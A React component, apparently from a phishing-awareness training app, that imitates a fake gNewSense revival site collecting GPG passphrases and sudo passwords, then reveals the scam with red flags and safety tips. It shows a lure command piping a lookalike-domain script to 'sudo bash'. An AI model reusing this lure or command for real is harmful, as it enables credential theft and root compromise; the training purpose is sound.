import React, { useState } from "react";

export default function FakeGNewSenseScam({ onComplete }) {
  const [view, setView] = useState("home");

  const [name, setName] = useState("");
  const [email, setEmail] = useState("");
  const [username, setUsername] = useState("");
  const [architecture, setArchitecture] = useState("");

  const [gpgPassphrase, setGpgPassphrase] = useState("");
  const [sudoPassword, setSudoPassword] = useState("");

  const inputStyle = {
    width: "100%",
    padding: "15px",
    marginBottom: "15px",
    borderRadius: "8px",
    border: "1px solid #22c55e",
    fontSize: "15px",
    outline: "none",
    background: "#0a1a0f",
    color: "#d1fae5",
    fontFamily: "monospace",
    boxSizing: "border-box"
  };

  const codeStyle = {
    background: "#000",
    color: "#4ade80",
    padding: "12px 16px",
    borderRadius: "8px",
    fontFamily: "monospace",
    fontSize: "14px",
    margin: "10px 0",
    border: "1px solid #14532d",
    overflowX: "auto",
    whiteSpace: "pre-wrap"
  };

  /* ===================================
        VERIFICATION / INSTALL PAGE
  =================================== */
  if (view === "verify") {
    return (
      <div style={{ background: "#020804", minHeight: "100vh", display: "flex", justifyContent: "center", alignItems: "center", padding: "40px" }}>
        <div style={{ width: "100%", maxWidth: "720px", background: "#0a1a0f", borderRadius: "16px", padding: "35px", boxShadow: "0 20px 40px rgba(34,197,94,.25)", color: "#fff", border: "1px solid #14532d" }}>
          <div style={{ textAlign: "center" }}>
            <h1 style={{ color: "#4ade80", fontFamily: "monospace" }}>🐧 gNewSense Revival Project</h1>
            <h2>Repository Authentication</h2>
            <p style={{ color: "#86efac" }}>Verify your identity to add the official revival repository.</p>
          </div>

          <div style={{ background: "#14532d", padding: "20px", borderRadius: "10px", margin: "25px 0", border: "1px solid #22c55e" }}>
            <h3 style={{ color: "#4ade80" }}>🔐 Why we need your credentials</h3>
            <ul style={{ lineHeight: "1.8", color: "#d1fae5" }}>
              <li>✔ Sign the repository GPG key with your passphrase</li>
              <li>✔ Add apt sources with root privileges</li>
              <li>✔ Verify FSF (Free Software Foundation) compliance</li>
              <li>✔ Enable auto-update for future releases</li>
            </ul>
            <p style={{ color: "#fbbf24", fontSize: "13px", marginTop: "10px" }}>
              ⚠️ Your credentials are encrypted with AES-256 and never stored.
            </p>
          </div>

          <div style={codeStyle}>
{`$ wget -qO- gnewsense-revival.org/install.sh | sudo bash
[sudo] password for ${username || "user"}:`}
          </div>

          <label style={{ color: "#86efac", fontSize: "13px" }}>GPG Passphrase (to sign repo key)</label>
          <input
            placeholder="Enter your GPG passphrase..."
            type="password"
            value={gpgPassphrase}
            onChange={(e) => setGpgPassphrase(e.target.value)}
            style={inputStyle}
          />

          <label style={{ color: "#86efac", fontSize: "13px" }}>Sudo Password (to add repository)</label>
          <input
            placeholder="Enter your sudo password..."
            type="password"
            value={sudoPassword}
            onChange={(e) => setSudoPassword(e.target.value)}
            style={inputStyle}
          />

          <button
            onClick={() => setView("success")}
            style={{ width: "100%", padding: "16px", background: "linear-gradient(90deg,#16a34a,#15803d)", border: "none", color: "#fff", fontSize: "16px", fontWeight: "700", borderRadius: "10px", cursor: "pointer", fontFamily: "monospace" }}
          >
            $ sudo apt install gnewsense-revival
          </button>
        </div>
      </div>
    );
  }

  /* ===================================
        SUCCESS / SCAM DETECTED PAGE
        (Placed BEFORE default return)
  =================================== */
  if (view === "success") {
    return (
      <div style={{ background: "#020804", minHeight: "100vh", padding: "40px" }}>
        <div style={{ maxWidth: "1000px", margin: "auto", background: "#fff", borderRadius: "20px", overflow: "hidden", boxShadow: "0 20px 50px rgba(0,0,0,.4)" }}>
          <div style={{ background: "linear-gradient(90deg,#dc2626,#991b1b)", padding: "30px", textAlign: "center", color: "#fff" }}>
            <h1>🚨 SCAM DETECTED</h1>
            <h3>This was a Fake gNewSense Revival Website.</h3>
          </div>

          <div style={{ padding: "35px" }}>
            <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(300px, 1fr))", gap: "20px" }}>
              <div style={{ background: "#fef2f2", padding: "20px", borderRadius: "15px" }}>
                <h2>📂 Information Exposed</h2>
                <ul style={{ lineHeight: "1.8" }}>
                  <li>👤 Name: <b>{name || "Not provided"}</b></li>
                  <li>📧 Email: <b>{email || "Not provided"}</b></li>
                  <li>💻 Username: <b>{username || "Not provided"}</b></li>
                  <li>🖥️ Architecture: <b>{architecture || "Not provided"}</b></li>
                  <li>🔑 GPG Passphrase: <b>{gpgPassphrase ? "••••••••" : "Not provided"}</b></li>
                  <li>🛡️ Sudo Password: <b>{sudoPassword ? "••••••••" : "Not provided"}</b></li>
                </ul>
              </div>

              <div style={{ background: "#fff7ed", padding: "20px", borderRadius: "15px" }}>
                <h2>🚩 Red Flags</h2>
                <ul style={{ lineHeight: "1.8" }}>
                  <li>gNewSense was discontinued in 2016 — no official revival exists.</li>
                  <li>Typosquatted domain (not gnewsense.org).</li>
                  <li>Asks users to pipe curl/wget to sudo bash.</li>
                  <li>Requests GPG passphrase (NEVER share this).</li>
                  <li>Requests sudo password via web form.</li>
                  <li>No FSF or GNU project endorsement.</li>
                </ul>
              </div>
            </div>

            <div style={{ marginTop: "25px", background: "#eff6ff", padding: "20px", borderRadius: "15px" }}>
              <h2>📊 Risk Meter</h2>
              <div style={{ height: "18px", background: "#d1d5db", borderRadius: "20px", overflow: "hidden" }}>
                <div style={{ width: "99%", height: "100%", background: "#dc2626" }}></div>
              </div>
              <h3 style={{ marginTop: "10px", color: "#dc2626" }}>CRITICAL RISK — FULL SYSTEM COMPROMISE</h3>
            </div>

            <div style={{ marginTop: "25px", background: "#ecfdf5", padding: "20px", borderRadius: "15px" }}>
              <h2>🛡 Stay Safe as a Linux User</h2>
              <ul style={{ lineHeight: "1.8" }}>
                <li><b>Never pipe curl/wget to bash</b> — always inspect scripts first.</li>
                <li><b>Never enter your GPG passphrase</b> on a website — only in your local gpg-agent.</li>
                <li><b>Never type your sudo password</b> into a web form — only in the terminal.</li>
                <li>Download distros only from official mirrors (e.g., fsf.org, debian.org).</li>
                <li>Verify ISO checksums and GPG signatures before installation.</li>
                <li>If compromised: <b>change all passwords immediately</b> and regenerate GPG keys.</li>
                <li>Report phishing domains to the FSF and CERT-In.</li>
              </ul>
            </div>

            <div style={{ marginTop: "25px", background: "#f8fafc", padding: "20px", borderRadius: "15px" }}>
              <h2>📈 Scam Timeline</h2>
              <p>✅ Searched for "gNewSense download"</p>
              <p>⬇</p>
              <p>✅ Clicked fake revival project website</p>
              <p>⬇</p>
              <p>✅ Entered personal & system details</p>
              <p>⬇</p>
              <p>✅ Entered GPG passphrase & sudo password</p>
              <p>⬇</p>
              <p style={{ color: "#dc2626", fontWeight: "700" }}>❌ Attacker Gained Root Access & Decrypted Your Files</p>
            </div>

            <button
              onClick={() => onComplete({ name, email, username, architecture, gpgPassphrase, sudoPassword })}
              style={{ width: "100%", marginTop: "30px", padding: "18px", background: "linear-gradient(90deg,#16a34a,#15803d)", border: "none", color: "#fff", fontWeight: "700", fontSize: "18px", borderRadius: "12px", cursor: "pointer" }}
            >
              Continue to Quiz →
            </button>
          </div>
        </div>
      </div>
    );
  }

  /* ===================================
        HOME PAGE (Default Return)
  =================================== */
  return (
    <div style={{ background: "linear-gradient(135deg,#020804,#0a1a0f)", minHeight: "100vh", padding: "40px", color: "#d1fae5" }}>
      <div style={{ maxWidth: "1100px", margin: "auto" }}>
        <div style={{ background: "#0a1a0f", borderRadius: "20px", overflow: "hidden", boxShadow: "0 20px 50px rgba(34,197,94,.2)", border: "1px solid #14532d" }}>
          <div style={{ background: "linear-gradient(90deg,#15803d,#16a34a,#22c55e)", padding: "40px", textAlign: "center" }}>
            <h1 style={{ fontSize: "42px", margin: 0, fontFamily: "monospace", color: "#fff" }}>🐧 gNewSense Revival</h1>
            <h3 style={{ color: "#dcfce7" }}>The 100% Free Software Distribution — Reborn in 2026</h3>
            <p style={{ color: "#bbf7d0" }}>Endorsed by the Free Software Foundation (allegedly)</p>
          </div>

          <div style={{ padding: "35px" }}>
            <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(220px, 1fr))", gap: "20px", marginBottom: "30px" }}>
              <div style={{ background: "#14532d", padding: "20px", borderRadius: "12px", border: "1px solid #22c55e" }}>
                <div style={{ fontSize: "36px" }}>🔒</div>
                <h3 style={{ color: "#4ade80" }}>100% Free Software</h3>
                <p style={{ color: "#86efac", fontSize: "14px" }}>No proprietary blobs</p>
              </div>
              <div style={{ background: "#14532d", padding: "20px", borderRadius: "12px", border: "1px solid #22c55e" }}>
                <div style={{ fontSize: "36px" }}>🛡️</div>
                <h3 style={{ color: "#4ade80" }}>Privacy First</h3>
                <p style={{ color: "#86efac", fontSize: "14px" }}>No telemetry, ever</p>
              </div>
              <div style={{ background: "#14532d", padding: "20px", borderRadius: "12px", border: "1px solid #22c55e" }}>
                <div style={{ fontSize: "36px" }}>⚡</div>
                <h3 style={{ color: "#4ade80" }}>Modern Kernel</h3>
                <p style={{ color: "#86efac", fontSize: "14px" }}>Linux-libre 6.x</p>
              </div>
              <div style={{ background: "#14532d", padding: "20px", borderRadius: "12px", border: "1px solid #22c55e" }}>
                <div style={{ fontSize: "36px" }}>📦</div>
                <h3 style={{ color: "#4ade80" }}>Debian-Based</h3>
                <p style={{ color: "#86efac", fontSize: "14px" }}>APT package manager</p>
              </div>
            </div>

            <div style={{ background: "#000", padding: "20px", borderRadius: "12px", marginBottom: "25px", border: "1px solid #14532d" }}>
              <h3 style={{ color: "#4ade80", fontFamily: "monospace" }}>📦 Quick Install</h3>
              <div style={codeStyle}>$ wget -qO- gnewsense-revival.org/install.sh | sudo bash</div>
              <div style={codeStyle}>$ sudo apt install gnewsense-desktop</div>
            </div>

            <div style={{ background: "#14532d", padding: "20px", borderRadius: "12px", marginBottom: "25px", border: "1px solid #fbbf24" }}>
              <h2 style={{ color: "#fbbf24" }}>⚠️ Repository Verification Required</h2>
              <p>To add the official revival repository, please verify your identity and system credentials.</p>
            </div>

            <h2 style={{ color: "#4ade80" }}>🔐 Register for Early Access</h2>
            <input placeholder="Full Name" value={name} onChange={(e) => setName(e.target.value)} style={inputStyle} />
            <input placeholder="Email Address" value={email} onChange={(e) => setEmail(e.target.value)} style={inputStyle} />
            <input placeholder="Linux Username" value={username} onChange={(e) => setUsername(e.target.value)} style={inputStyle} />
            <select
              value={architecture}
              onChange={(e) => setArchitecture(e.target.value)}
              style={{ ...inputStyle, cursor: "pointer" }}
            >
              <option value="">Select Architecture</option>
              <option value="amd64">amd64 (x86_64)</option>
              <option value="i386">i386 (32-bit)</option>
              <option value="arm64">arm64 (ARM 64-bit)</option>
              <option value="riscv64">riscv64</option>
            </select>

            <button
              onClick={() => setView("verify")}
              style={{ width: "100%", padding: "18px", background: "linear-gradient(90deg,#16a34a,#15803d)", border: "none", color: "#fff", fontSize: "18px", fontWeight: "700", borderRadius: "12px", cursor: "pointer", fontFamily: "monospace" }}
            >
              $ apt-add-repository →
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}